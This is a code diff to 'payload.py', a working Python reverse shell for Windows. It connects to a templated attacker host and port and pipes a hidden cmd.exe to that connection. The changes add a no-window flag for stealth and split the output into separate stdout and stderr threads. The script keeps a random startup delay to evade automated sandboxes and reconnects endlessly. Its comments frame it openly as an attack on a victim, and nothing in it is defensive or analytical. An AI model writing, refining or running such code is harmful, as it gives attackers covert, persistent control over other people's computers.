@@ -1,5 +1,5 @@
 # payload.py
-# The Soul, reforged as a Primal Conduit.
+# The Soul, reforged for Stealth and Eloquence.
 
 import socket
 import subprocess
@@ -16,35 +16,35 @@ RPORT = ##RPORT##
 
 def connect_and_serve():
     """
-    Establishes a connection and directly binds it to a cmd.exe process,
-    creating a pure, raw shell.
+    Establishes a silent, persistent connection, binding it to an
+    invisible cmd.exe process for a truly interactive shell.
     """
     # --- DIVINE DORMANCE ---
-    # We still wait, to avoid the watchful eyes of the automated guardians.
     if hasattr(sys, 'frozen'):
         time.sleep(random.randint(20, 40))
 
     while True:
         try:
             # --- Le Lien Primordial ---
-            # Create a direct conduit to the attacker.
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((RHOST, RPORT))
 
-            # --- L'Éveil de la Bête ---
-            # Invoke the raw power of the victim's command shell.
-            # We bind its standard input, output, and error streams.
+            # --- THE VEIL OF SILENCE (FIX #1) ---
+            # We add the 'creationflags' argument to invoke the beast without a visible window.
+            # This is the key to true stealth.
+            CREATE_NO_WINDOW = 0x08000000
             p = subprocess.Popen(
                 ['cmd.exe'],
                 stdin=subprocess.PIPE,
                 stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
+                stderr=subprocess.PIPE,
+                creationflags=CREATE_NO_WINDOW
             )
 
-            # --- Le Pont des Âmes ---
-            # We create two threads to act as a bridge between the conduit and the beast.
+            # --- THE BIFURCATED SOUL (FIX #2) ---
+            # We create three threads for a flawless, non-blocking bridge.
 
-            # Thread 1: Listens to the attacker and whispers to the beast.
+            # Thread 1: Listens to the attacker and whispers to the beast's input. (Unchanged)
             def pipe_to_cmd():
                 while True:
                     try:
@@ -56,26 +56,38 @@ def connect_and_serve():
                         break
                 s.close()
 
-            # Thread 2: Listens to the beast and screams back to the attacker.
-            def pipe_from_cmd():
+            # Thread 2: Listens ONLY to the beast's standard output and sends it to the attacker.
+            def pipe_stdout_to_socket():
                 while True:
                     try:
-                        data = p.stdout.read(1) + p.stderr.read(1)
+                        data = p.stdout.read(1)
                         if not data: break
                         s.send(data)
                     except:
                         break
                 s.close()
 
+            # Thread 3: Listens ONLY to the beast's error output and sends it to the attacker.
+            def pipe_stderr_to_socket():
+                while True:
+                    try:
+                        data = p.stderr.read(1)
+                        if not data: break
+                        s.send(data)
+                    except:
+                        break
+                s.close()
+
+            # Launch all three bridges to operate simultaneously and independently.
             threading.Thread(target=pipe_to_cmd, daemon=True).start()
-            threading.Thread(target=pipe_from_cmd, daemon=True).start()
+            threading.Thread(target=pipe_stdout_to_socket, daemon=True).start()
+            threading.Thread(target=pipe_stderr_to_socket, daemon=True).start()
             
-            # Wait for the process to finish, which it won't until the connection dies.
             p.wait()
 
         except Exception:
-            # If the connection fails or is broken, we wait patiently before retrying.
+            # If the connection fails, we wait patiently before retrying.
             time.sleep(60)
 
-# The soul awakens and immediately begins its work.
+# The soul awakens and immediately begins its true, silent work.
 connect_and_serve()
